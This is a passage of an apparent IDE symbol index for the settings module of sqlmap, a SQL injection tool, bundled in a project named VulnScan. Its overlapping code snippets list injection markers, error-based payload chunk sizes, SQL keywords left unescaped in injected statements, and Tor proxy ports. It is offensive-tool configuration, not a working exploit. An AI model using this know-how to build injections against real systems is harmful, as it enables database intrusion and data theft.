        "peekOfCode": "CANDIDATE_SENTENCE_MIN_LENGTH = 10\n# Character used for marking injectable position inside provided data\nCUSTOM_INJECTION_MARK_CHAR = '*'\n# Wildcard value that can be used in option --ignore-code\nIGNORE_CODE_WILDCARD = '*'\n# Other way to declare injection position\nINJECT_HERE_REGEX = r\"(?i)%INJECT[_ ]?HERE%\"\n# Minimum chunk length used for retrieving data over error based payloads\nMIN_ERROR_CHUNK_LENGTH = 8\n# Maximum chunk length used for retrieving data over error based payloads",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CUSTOM_INJECTION_MARK_CHAR",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "CUSTOM_INJECTION_MARK_CHAR = '*'\n# Wildcard value that can be used in option --ignore-code\nIGNORE_CODE_WILDCARD = '*'\n# Other way to declare injection position\nINJECT_HERE_REGEX = r\"(?i)%INJECT[_ ]?HERE%\"\n# Minimum chunk length used for retrieving data over error based payloads\nMIN_ERROR_CHUNK_LENGTH = 8\n# Maximum chunk length used for retrieving data over error based payloads\nMAX_ERROR_CHUNK_LENGTH = 1024\n# Do not escape the injected statement if it contains any of the following SQL keywords",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IGNORE_CODE_WILDCARD",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "IGNORE_CODE_WILDCARD = '*'\n# Other way to declare injection position\nINJECT_HERE_REGEX = r\"(?i)%INJECT[_ ]?HERE%\"\n# Minimum chunk length used for retrieving data over error based payloads\nMIN_ERROR_CHUNK_LENGTH = 8\n# Maximum chunk length used for retrieving data over error based payloads\nMAX_ERROR_CHUNK_LENGTH = 1024\n# Do not escape the injected statement if it contains any of the following SQL keywords\nEXCLUDE_UNESCAPE = (\"WAITFOR DELAY '\", \" INTO DUMPFILE \", \" INTO OUTFILE \", \"CREATE \", \"BULK \", \"EXEC \", \"RECONFIGURE \", \"DECLARE \", \"'%s'\" % CHAR_INFERENCE_MARK)\n# Mark used for replacement of reflected values",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "INJECT_HERE_REGEX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "INJECT_HERE_REGEX = r\"(?i)%INJECT[_ ]?HERE%\"\n# Minimum chunk length used for retrieving data over error based payloads\nMIN_ERROR_CHUNK_LENGTH = 8\n# Maximum chunk length used for retrieving data over error based payloads\nMAX_ERROR_CHUNK_LENGTH = 1024\n# Do not escape the injected statement if it contains any of the following SQL keywords\nEXCLUDE_UNESCAPE = (\"WAITFOR DELAY '\", \" INTO DUMPFILE \", \" INTO OUTFILE \", \"CREATE \", \"BULK \", \"EXEC \", \"RECONFIGURE \", \"DECLARE \", \"'%s'\" % CHAR_INFERENCE_MARK)\n# Mark used for replacement of reflected values\nREFLECTED_VALUE_MARKER = \"__REFLECTED_VALUE__\"\n# Regular expression used for replacing border non-alphanum characters",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MIN_ERROR_CHUNK_LENGTH",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MIN_ERROR_CHUNK_LENGTH = 8\n# Maximum chunk length used for retrieving data over error based payloads\nMAX_ERROR_CHUNK_LENGTH = 1024\n# Do not escape the injected statement if it contains any of the following SQL keywords\nEXCLUDE_UNESCAPE = (\"WAITFOR DELAY '\", \" INTO DUMPFILE \", \" INTO OUTFILE \", \"CREATE \", \"BULK \", \"EXEC \", \"RECONFIGURE \", \"DECLARE \", \"'%s'\" % CHAR_INFERENCE_MARK)\n# Mark used for replacement of reflected values\nREFLECTED_VALUE_MARKER = \"__REFLECTED_VALUE__\"\n# Regular expression used for replacing border non-alphanum characters\nREFLECTED_BORDER_REGEX = r\"[^A-Za-z]+\"\n# Regular expression used for replacing non-alphanum characters",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_ERROR_CHUNK_LENGTH",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MAX_ERROR_CHUNK_LENGTH = 1024\n# Do not escape the injected statement if it contains any of the following SQL keywords\nEXCLUDE_UNESCAPE = (\"WAITFOR DELAY '\", \" INTO DUMPFILE \", \" INTO OUTFILE \", \"CREATE \", \"BULK \", \"EXEC \", \"RECONFIGURE \", \"DECLARE \", \"'%s'\" % CHAR_INFERENCE_MARK)\n# Mark used for replacement of reflected values\nREFLECTED_VALUE_MARKER = \"__REFLECTED_VALUE__\"\n# Regular expression used for replacing border non-alphanum characters\nREFLECTED_BORDER_REGEX = r\"[^A-Za-z]+\"\n# Regular expression used for replacing non-alphanum characters\nREFLECTED_REPLACEMENT_REGEX = r\"[^\\n]{1,168}\"\n# Maximum time (in seconds) spent per reflective value(s) replacement",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "EXCLUDE_UNESCAPE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "EXCLUDE_UNESCAPE = (\"WAITFOR DELAY '\", \" INTO DUMPFILE \", \" INTO OUTFILE \", \"CREATE \", \"BULK \", \"EXEC \", \"RECONFIGURE \", \"DECLARE \", \"'%s'\" % CHAR_INFERENCE_MARK)\n# Mark used for replacement of reflected values\nREFLECTED_VALUE_MARKER = \"__REFLECTED_VALUE__\"\n# Regular expression used for replacing border non-alphanum characters\nREFLECTED_BORDER_REGEX = r\"[^A-Za-z]+\"\n# Regular expression used for replacing non-alphanum characters\nREFLECTED_REPLACEMENT_REGEX = r\"[^\\n]{1,168}\"\n# Maximum time (in seconds) spent per reflective value(s) replacement\nREFLECTED_REPLACEMENT_TIMEOUT = 3\n# Maximum number of alpha-numerical parts in reflected regex (for speed purposes)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "REFLECTED_VALUE_MARKER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "REFLECTED_VALUE_MARKER = \"__REFLECTED_VALUE__\"\n# Regular expression used for replacing border non-alphanum characters\nREFLECTED_BORDER_REGEX = r\"[^A-Za-z]+\"\n# Regular expression used for replacing non-alphanum characters\nREFLECTED_REPLACEMENT_REGEX = r\"[^\\n]{1,168}\"\n# Maximum time (in seconds) spent per reflective value(s) replacement\nREFLECTED_REPLACEMENT_TIMEOUT = 3\n# Maximum number of alpha-numerical parts in reflected regex (for speed purposes)\nREFLECTED_MAX_REGEX_PARTS = 10\n# Chars which can be used as a failsafe values in case of too long URL encoding value",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "REFLECTED_BORDER_REGEX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "REFLECTED_BORDER_REGEX = r\"[^A-Za-z]+\"\n# Regular expression used for replacing non-alphanum characters\nREFLECTED_REPLACEMENT_REGEX = r\"[^\\n]{1,168}\"\n# Maximum time (in seconds) spent per reflective value(s) replacement\nREFLECTED_REPLACEMENT_TIMEOUT = 3\n# Maximum number of alpha-numerical parts in reflected regex (for speed purposes)\nREFLECTED_MAX_REGEX_PARTS = 10\n# Chars which can be used as a failsafe values in case of too long URL encoding value\nURLENCODE_FAILSAFE_CHARS = \"()|,\"\n# Factor used for yuge page multiplication",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "REFLECTED_REPLACEMENT_REGEX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "REFLECTED_REPLACEMENT_REGEX = r\"[^\\n]{1,168}\"\n# Maximum time (in seconds) spent per reflective value(s) replacement\nREFLECTED_REPLACEMENT_TIMEOUT = 3\n# Maximum number of alpha-numerical parts in reflected regex (for speed purposes)\nREFLECTED_MAX_REGEX_PARTS = 10\n# Chars which can be used as a failsafe values in case of too long URL encoding value\nURLENCODE_FAILSAFE_CHARS = \"()|,\"\n# Factor used for yuge page multiplication\nYUGE_FACTOR = 1000\n# Maximum length of URL encoded value after which failsafe procedure takes away",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "REFLECTED_REPLACEMENT_TIMEOUT",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "REFLECTED_REPLACEMENT_TIMEOUT = 3\n# Maximum number of alpha-numerical parts in reflected regex (for speed purposes)\nREFLECTED_MAX_REGEX_PARTS = 10\n# Chars which can be used as a failsafe values in case of too long URL encoding value\nURLENCODE_FAILSAFE_CHARS = \"()|,\"\n# Factor used for yuge page multiplication\nYUGE_FACTOR = 1000\n# Maximum length of URL encoded value after which failsafe procedure takes away\nURLENCODE_CHAR_LIMIT = 2000\n# Default schema for Microsoft SQL Server DBMS",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "REFLECTED_MAX_REGEX_PARTS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "REFLECTED_MAX_REGEX_PARTS = 10\n# Chars which can be used as a failsafe values in case of too long URL encoding value\nURLENCODE_FAILSAFE_CHARS = \"()|,\"\n# Factor used for yuge page multiplication\nYUGE_FACTOR = 1000\n# Maximum length of URL encoded value after which failsafe procedure takes away\nURLENCODE_CHAR_LIMIT = 2000\n# Default schema for Microsoft SQL Server DBMS\nDEFAULT_MSSQL_SCHEMA = \"dbo\"\n# Display hash attack info every mod number of items",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "URLENCODE_FAILSAFE_CHARS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "URLENCODE_FAILSAFE_CHARS = \"()|,\"\n# Factor used for yuge page multiplication\nYUGE_FACTOR = 1000\n# Maximum length of URL encoded value after which failsafe procedure takes away\nURLENCODE_CHAR_LIMIT = 2000\n# Default schema for Microsoft SQL Server DBMS\nDEFAULT_MSSQL_SCHEMA = \"dbo\"\n# Display hash attack info every mod number of items\nHASH_MOD_ITEM_DISPLAY = 11\n# Display marker for (cracked) empty password",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "YUGE_FACTOR",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "YUGE_FACTOR = 1000\n# Maximum length of URL encoded value after which failsafe procedure takes away\nURLENCODE_CHAR_LIMIT = 2000\n# Default schema for Microsoft SQL Server DBMS\nDEFAULT_MSSQL_SCHEMA = \"dbo\"\n# Display hash attack info every mod number of items\nHASH_MOD_ITEM_DISPLAY = 11\n# Display marker for (cracked) empty password\nHASH_EMPTY_PASSWORD_MARKER = \"<empty>\"\n# Maximum integer value",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "URLENCODE_CHAR_LIMIT",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "URLENCODE_CHAR_LIMIT = 2000\n# Default schema for Microsoft SQL Server DBMS\nDEFAULT_MSSQL_SCHEMA = \"dbo\"\n# Display hash attack info every mod number of items\nHASH_MOD_ITEM_DISPLAY = 11\n# Display marker for (cracked) empty password\nHASH_EMPTY_PASSWORD_MARKER = \"<empty>\"\n# Maximum integer value\nMAX_INT = sys.maxsize\n# Replacement for unsafe characters in dump table filenames",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DEFAULT_MSSQL_SCHEMA",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "DEFAULT_MSSQL_SCHEMA = \"dbo\"\n# Display hash attack info every mod number of items\nHASH_MOD_ITEM_DISPLAY = 11\n# Display marker for (cracked) empty password\nHASH_EMPTY_PASSWORD_MARKER = \"<empty>\"\n# Maximum integer value\nMAX_INT = sys.maxsize\n# Replacement for unsafe characters in dump table filenames\nUNSAFE_DUMP_FILEPATH_REPLACEMENT = '_'\n# Options that need to be restored in multiple targets run mode",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "HASH_MOD_ITEM_DISPLAY",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "HASH_MOD_ITEM_DISPLAY = 11\n# Display marker for (cracked) empty password\nHASH_EMPTY_PASSWORD_MARKER = \"<empty>\"\n# Maximum integer value\nMAX_INT = sys.maxsize\n# Replacement for unsafe characters in dump table filenames\nUNSAFE_DUMP_FILEPATH_REPLACEMENT = '_'\n# Options that need to be restored in multiple targets run mode\nRESTORE_MERGED_OPTIONS = (\"col\", \"db\", \"dnsDomain\", \"privEsc\", \"tbl\", \"regexp\", \"string\", \"textOnly\", \"threads\", \"timeSec\", \"tmpPath\", \"uChar\", \"user\")\n# Parameters to be ignored in detection phase (upper case)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "HASH_EMPTY_PASSWORD_MARKER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "HASH_EMPTY_PASSWORD_MARKER = \"<empty>\"\n# Maximum integer value\nMAX_INT = sys.maxsize\n# Replacement for unsafe characters in dump table filenames\nUNSAFE_DUMP_FILEPATH_REPLACEMENT = '_'\n# Options that need to be restored in multiple targets run mode\nRESTORE_MERGED_OPTIONS = (\"col\", \"db\", \"dnsDomain\", \"privEsc\", \"tbl\", \"regexp\", \"string\", \"textOnly\", \"threads\", \"timeSec\", \"tmpPath\", \"uChar\", \"user\")\n# Parameters to be ignored in detection phase (upper case)\nIGNORE_PARAMETERS = (\"__VIEWSTATE\", \"__VIEWSTATEENCRYPTED\", \"__VIEWSTATEGENERATOR\", \"__EVENTARGUMENT\", \"__EVENTTARGET\", \"__EVENTVALIDATION\", \"ASPSESSIONID\", \"ASP.NET_SESSIONID\", \"JSESSIONID\", \"CFID\", \"CFTOKEN\")\n# Regular expression used for recognition of ASP.NET control parameters",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_INT",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MAX_INT = sys.maxsize\n# Replacement for unsafe characters in dump table filenames\nUNSAFE_DUMP_FILEPATH_REPLACEMENT = '_'\n# Options that need to be restored in multiple targets run mode\nRESTORE_MERGED_OPTIONS = (\"col\", \"db\", \"dnsDomain\", \"privEsc\", \"tbl\", \"regexp\", \"string\", \"textOnly\", \"threads\", \"timeSec\", \"tmpPath\", \"uChar\", \"user\")\n# Parameters to be ignored in detection phase (upper case)\nIGNORE_PARAMETERS = (\"__VIEWSTATE\", \"__VIEWSTATEENCRYPTED\", \"__VIEWSTATEGENERATOR\", \"__EVENTARGUMENT\", \"__EVENTTARGET\", \"__EVENTVALIDATION\", \"ASPSESSIONID\", \"ASP.NET_SESSIONID\", \"JSESSIONID\", \"CFID\", \"CFTOKEN\")\n# Regular expression used for recognition of ASP.NET control parameters\nASP_NET_CONTROL_REGEX = r\"(?i)\\Actl\\d+\\$\"\n# Prefix for Google analytics cookie names",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "UNSAFE_DUMP_FILEPATH_REPLACEMENT",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "UNSAFE_DUMP_FILEPATH_REPLACEMENT = '_'\n# Options that need to be restored in multiple targets run mode\nRESTORE_MERGED_OPTIONS = (\"col\", \"db\", \"dnsDomain\", \"privEsc\", \"tbl\", \"regexp\", \"string\", \"textOnly\", \"threads\", \"timeSec\", \"tmpPath\", \"uChar\", \"user\")\n# Parameters to be ignored in detection phase (upper case)\nIGNORE_PARAMETERS = (\"__VIEWSTATE\", \"__VIEWSTATEENCRYPTED\", \"__VIEWSTATEGENERATOR\", \"__EVENTARGUMENT\", \"__EVENTTARGET\", \"__EVENTVALIDATION\", \"ASPSESSIONID\", \"ASP.NET_SESSIONID\", \"JSESSIONID\", \"CFID\", \"CFTOKEN\")\n# Regular expression used for recognition of ASP.NET control parameters\nASP_NET_CONTROL_REGEX = r\"(?i)\\Actl\\d+\\$\"\n# Prefix for Google analytics cookie names\nGOOGLE_ANALYTICS_COOKIE_PREFIX = \"__UTM\"\n# Prefix for configuration overriding environment variables",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "RESTORE_MERGED_OPTIONS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "RESTORE_MERGED_OPTIONS = (\"col\", \"db\", \"dnsDomain\", \"privEsc\", \"tbl\", \"regexp\", \"string\", \"textOnly\", \"threads\", \"timeSec\", \"tmpPath\", \"uChar\", \"user\")\n# Parameters to be ignored in detection phase (upper case)\nIGNORE_PARAMETERS = (\"__VIEWSTATE\", \"__VIEWSTATEENCRYPTED\", \"__VIEWSTATEGENERATOR\", \"__EVENTARGUMENT\", \"__EVENTTARGET\", \"__EVENTVALIDATION\", \"ASPSESSIONID\", \"ASP.NET_SESSIONID\", \"JSESSIONID\", \"CFID\", \"CFTOKEN\")\n# Regular expression used for recognition of ASP.NET control parameters\nASP_NET_CONTROL_REGEX = r\"(?i)\\Actl\\d+\\$\"\n# Prefix for Google analytics cookie names\nGOOGLE_ANALYTICS_COOKIE_PREFIX = \"__UTM\"\n# Prefix for configuration overriding environment variables\nSQLMAP_ENVIRONMENT_PREFIX = \"SQLMAP_\"\n# General OS environment variables that can be used for setting proxy address",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IGNORE_PARAMETERS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "IGNORE_PARAMETERS = (\"__VIEWSTATE\", \"__VIEWSTATEENCRYPTED\", \"__VIEWSTATEGENERATOR\", \"__EVENTARGUMENT\", \"__EVENTTARGET\", \"__EVENTVALIDATION\", \"ASPSESSIONID\", \"ASP.NET_SESSIONID\", \"JSESSIONID\", \"CFID\", \"CFTOKEN\")\n# Regular expression used for recognition of ASP.NET control parameters\nASP_NET_CONTROL_REGEX = r\"(?i)\\Actl\\d+\\$\"\n# Prefix for Google analytics cookie names\nGOOGLE_ANALYTICS_COOKIE_PREFIX = \"__UTM\"\n# Prefix for configuration overriding environment variables\nSQLMAP_ENVIRONMENT_PREFIX = \"SQLMAP_\"\n# General OS environment variables that can be used for setting proxy address\nPROXY_ENVIRONMENT_VARIABLES = (\"all_proxy\", \"ALL_PROXY\", \"http_proxy\", \"HTTP_PROXY\", \"https_proxy\", \"HTTPS_PROXY\")\n# Turn off resume console info to avoid potential slowdowns",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "ASP_NET_CONTROL_REGEX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "ASP_NET_CONTROL_REGEX = r\"(?i)\\Actl\\d+\\$\"\n# Prefix for Google analytics cookie names\nGOOGLE_ANALYTICS_COOKIE_PREFIX = \"__UTM\"\n# Prefix for configuration overriding environment variables\nSQLMAP_ENVIRONMENT_PREFIX = \"SQLMAP_\"\n# General OS environment variables that can be used for setting proxy address\nPROXY_ENVIRONMENT_VARIABLES = (\"all_proxy\", \"ALL_PROXY\", \"http_proxy\", \"HTTP_PROXY\", \"https_proxy\", \"HTTPS_PROXY\")\n# Turn off resume console info to avoid potential slowdowns\nTURN_OFF_RESUME_INFO_LIMIT = 20\n# Strftime format for results file used in multiple target mode",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "GOOGLE_ANALYTICS_COOKIE_PREFIX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "GOOGLE_ANALYTICS_COOKIE_PREFIX = \"__UTM\"\n# Prefix for configuration overriding environment variables\nSQLMAP_ENVIRONMENT_PREFIX = \"SQLMAP_\"\n# General OS environment variables that can be used for setting proxy address\nPROXY_ENVIRONMENT_VARIABLES = (\"all_proxy\", \"ALL_PROXY\", \"http_proxy\", \"HTTP_PROXY\", \"https_proxy\", \"HTTPS_PROXY\")\n# Turn off resume console info to avoid potential slowdowns\nTURN_OFF_RESUME_INFO_LIMIT = 20\n# Strftime format for results file used in multiple target mode\nRESULTS_FILE_FORMAT = \"results-%m%d%Y_%I%M%p.csv\"\n# Official web page with the list of Python supported codecs",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SQLMAP_ENVIRONMENT_PREFIX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "SQLMAP_ENVIRONMENT_PREFIX = \"SQLMAP_\"\n# General OS environment variables that can be used for setting proxy address\nPROXY_ENVIRONMENT_VARIABLES = (\"all_proxy\", \"ALL_PROXY\", \"http_proxy\", \"HTTP_PROXY\", \"https_proxy\", \"HTTPS_PROXY\")\n# Turn off resume console info to avoid potential slowdowns\nTURN_OFF_RESUME_INFO_LIMIT = 20\n# Strftime format for results file used in multiple target mode\nRESULTS_FILE_FORMAT = \"results-%m%d%Y_%I%M%p.csv\"\n# Official web page with the list of Python supported codecs\nCODECS_LIST_PAGE = \"http://docs.python.org/library/codecs.html#standard-encodings\"\n# Simple regular expression used to distinguish scalar from multiple-row commands (not sole condition)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PROXY_ENVIRONMENT_VARIABLES",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "PROXY_ENVIRONMENT_VARIABLES = (\"all_proxy\", \"ALL_PROXY\", \"http_proxy\", \"HTTP_PROXY\", \"https_proxy\", \"HTTPS_PROXY\")\n# Turn off resume console info to avoid potential slowdowns\nTURN_OFF_RESUME_INFO_LIMIT = 20\n# Strftime format for results file used in multiple target mode\nRESULTS_FILE_FORMAT = \"results-%m%d%Y_%I%M%p.csv\"\n# Official web page with the list of Python supported codecs\nCODECS_LIST_PAGE = \"http://docs.python.org/library/codecs.html#standard-encodings\"\n# Simple regular expression used to distinguish scalar from multiple-row commands (not sole condition)\nSQL_SCALAR_REGEX = r\"\\A(SELECT(?!\\s+DISTINCT\\(?))?\\s*\\w*\\(\"\n# Option/switch values to ignore during configuration save",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "TURN_OFF_RESUME_INFO_LIMIT",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "TURN_OFF_RESUME_INFO_LIMIT = 20\n# Strftime format for results file used in multiple target mode\nRESULTS_FILE_FORMAT = \"results-%m%d%Y_%I%M%p.csv\"\n# Official web page with the list of Python supported codecs\nCODECS_LIST_PAGE = \"http://docs.python.org/library/codecs.html#standard-encodings\"\n# Simple regular expression used to distinguish scalar from multiple-row commands (not sole condition)\nSQL_SCALAR_REGEX = r\"\\A(SELECT(?!\\s+DISTINCT\\(?))?\\s*\\w*\\(\"\n# Option/switch values to ignore during configuration save\nIGNORE_SAVE_OPTIONS = (\"saveConfig\",)\n# IP address of the localhost",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "RESULTS_FILE_FORMAT",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "RESULTS_FILE_FORMAT = \"results-%m%d%Y_%I%M%p.csv\"\n# Official web page with the list of Python supported codecs\nCODECS_LIST_PAGE = \"http://docs.python.org/library/codecs.html#standard-encodings\"\n# Simple regular expression used to distinguish scalar from multiple-row commands (not sole condition)\nSQL_SCALAR_REGEX = r\"\\A(SELECT(?!\\s+DISTINCT\\(?))?\\s*\\w*\\(\"\n# Option/switch values to ignore during configuration save\nIGNORE_SAVE_OPTIONS = (\"saveConfig\",)\n# IP address of the localhost\nLOCALHOST = \"127.0.0.1\"\n# Default SOCKS ports used by Tor",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CODECS_LIST_PAGE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "CODECS_LIST_PAGE = \"http://docs.python.org/library/codecs.html#standard-encodings\"\n# Simple regular expression used to distinguish scalar from multiple-row commands (not sole condition)\nSQL_SCALAR_REGEX = r\"\\A(SELECT(?!\\s+DISTINCT\\(?))?\\s*\\w*\\(\"\n# Option/switch values to ignore during configuration save\nIGNORE_SAVE_OPTIONS = (\"saveConfig\",)\n# IP address of the localhost\nLOCALHOST = \"127.0.0.1\"\n# Default SOCKS ports used by Tor\nDEFAULT_TOR_SOCKS_PORTS = (9050, 9150)\n# Default HTTP ports used by Tor",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SQL_SCALAR_REGEX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "SQL_SCALAR_REGEX = r\"\\A(SELECT(?!\\s+DISTINCT\\(?))?\\s*\\w*\\(\"\n# Option/switch values to ignore during configuration save\nIGNORE_SAVE_OPTIONS = (\"saveConfig\",)\n# IP address of the localhost\nLOCALHOST = \"127.0.0.1\"\n# Default SOCKS ports used by Tor\nDEFAULT_TOR_SOCKS_PORTS = (9050, 9150)\n# Default HTTP ports used by Tor\nDEFAULT_TOR_HTTP_PORTS = (8123, 8118)\n# Percentage below which comparison engine could have problems",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "IGNORE_SAVE_OPTIONS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "IGNORE_SAVE_OPTIONS = (\"saveConfig\",)\n# IP address of the localhost\nLOCALHOST = \"127.0.0.1\"\n# Default SOCKS ports used by Tor\nDEFAULT_TOR_SOCKS_PORTS = (9050, 9150)\n# Default HTTP ports used by Tor\nDEFAULT_TOR_HTTP_PORTS = (8123, 8118)\n# Percentage below which comparison engine could have problems\nLOW_TEXT_PERCENT = 20\n# Auxiliary value used in isDBMSVersionAtLeast() version comparison correction cases",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "LOCALHOST",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "LOCALHOST = \"127.0.0.1\"\n# Default SOCKS ports used by Tor\nDEFAULT_TOR_SOCKS_PORTS = (9050, 9150)\n# Default HTTP ports used by Tor\nDEFAULT_TOR_HTTP_PORTS = (8123, 8118)\n# Percentage below which comparison engine could have problems\nLOW_TEXT_PERCENT = 20\n# Auxiliary value used in isDBMSVersionAtLeast() version comparison correction cases\nVERSION_COMPARISON_CORRECTION = 0.0001\n# These MySQL keywords can't go (alone) into versioned comment form (/*!...*/)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DEFAULT_TOR_SOCKS_PORTS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
